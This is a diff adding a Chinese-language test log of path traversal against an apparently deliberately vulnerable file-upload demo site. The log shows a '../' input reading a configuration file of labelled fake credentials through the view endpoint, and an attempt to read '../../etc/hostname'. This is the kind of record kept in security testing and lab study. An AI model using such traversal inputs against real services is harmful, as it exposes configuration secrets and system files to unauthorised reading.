@@ -1,0 +1,21 @@
+=== 0 摸情况：首页功能 ===
+<h1>文件上传演示站</h1><form action="/upload" method="post" enctype="multipart/form-data"><input type="file" name="file"><button type="submit">上传</button></form><p><a href="/view?name=note.txt">查看已上传文件</a></p>
+
+=== 1 正常上传一个便签 ===
+{"ok": true, "saved": "note.txt"}
+    查看刚传的文件：
+{"file": "note.txt", "content": "hello from normal upload"}
+
+=== 2 先探一下：能不能跳出上传目录（读上级的假配置）===
+{"file": "../config/fake_secrets.env", "content": "# ===== 本文件全是靶机编造的假数据，不是真实密钥 =====\nFAKE_DB_HOST=127.0.0.1\nFAKE_DB_USER=fake_admin\nFAKE_DB_PASS=THIS_IS_FAKE_DO_NOT_USE_12345\nFAKE_API_TOKEN=fake-token-0000000000\n"}
+
+=== 3 复现3次，确认稳定 ===
+{"file": "../config/fake_secrets.env", "content": "# ===== 本文件全是靶机编造的假数据，不是真实密钥 =====\nFAKE_DB_HOST=127.0.0.1\nFAKE_DB_USER=fake_admin\nFAKE_DB_PASS=THIS_IS_FAK
+{"file": "../config/fake_secrets.env", "content": "# ===== 本文件全是靶机编造的假数据，不是真实密钥 =====\nFAKE_DB_HOST=127.0.0.1\nFAKE_DB_USER=fake_admin\nFAKE_DB_PASS=THIS_IS_FAK
+{"file": "../config/fake_secrets.env", "content": "# ===== 本文件全是靶机编造的假数据，不是真实密钥 =====\nFAKE_DB_HOST=127.0.0.1\nFAKE_DB_USER=fake_admin\nFAKE_DB_PASS=THIS_IS_FAK
+
+=== 4 对照：读不存在的文件 ===
+{"error": "[Errno 2] No such file or directory: '/tmp/web4/uploads/../config/not_exist_xyz'"}
+
+=== 5 边界确认：根目录外的真实文件能不能读到（预期读不到）===
+{"error": "[Errno 2] No such file or directory: '/tmp/web4/uploads/../../etc/hostname'"}
